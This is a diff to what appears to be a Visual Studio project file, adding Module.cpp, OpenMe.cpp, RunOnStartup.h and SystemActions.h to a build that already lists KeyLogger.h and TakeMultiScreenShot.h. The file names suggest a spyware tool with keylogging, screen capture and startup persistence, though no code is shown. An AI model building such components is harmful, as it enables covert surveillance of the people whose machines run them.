@@ -127,6 +127,8 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="Module.cpp" />
+    <ClCompile Include="OpenMe.cpp" />
     <ClCompile Include="WC.cpp" />
   </ItemGroup>
   <ItemGroup>
@@ -134,7 +136,9 @@
     <ClInclude Include="GetRegistryKeys.h" />
     <ClInclude Include="GetSystemInfo.h" />
     <ClInclude Include="KeyLogger.h" />
+    <ClInclude Include="RunOnStartup.h" />
     <ClInclude Include="SetWallpaper.h" />
+    <ClInclude Include="SystemActions.h" />
     <ClInclude Include="TakeMultiScreenShot.h" />
     <ClInclude Include="TemporaryFilePath.h" />
   </ItemGroup>
